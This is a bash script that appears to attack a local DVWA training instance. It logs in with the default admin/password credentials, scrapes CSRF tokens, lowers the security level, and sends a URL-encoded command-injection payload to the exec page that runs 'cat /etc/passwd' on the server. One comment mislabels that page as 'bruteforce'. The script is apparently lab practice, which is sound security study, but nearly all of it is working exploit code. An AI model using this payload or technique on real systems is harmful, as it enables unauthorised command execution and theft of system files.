#Login with found details
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to medium (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.medium -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.medium -c dvwa.cookie.medium -d $"security=medium&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "bruteforce" page
curl -s -i -L -b dvwa.cookie.medium "192.168.178.98/dvwa/vulnerabilities/exec/" > /dev/null
#Get the server to 'cat /etc/passwd'
curl -s -i -L -b dvwa.cookie.medium "192.168.178.98/dvwa/vulnerabilities/exec/" -d "ip=127.0.0.1++%26%3B+cat+%2Fetc%2Fpasswd&Submit=Submit" > result
rm -f dvwa*
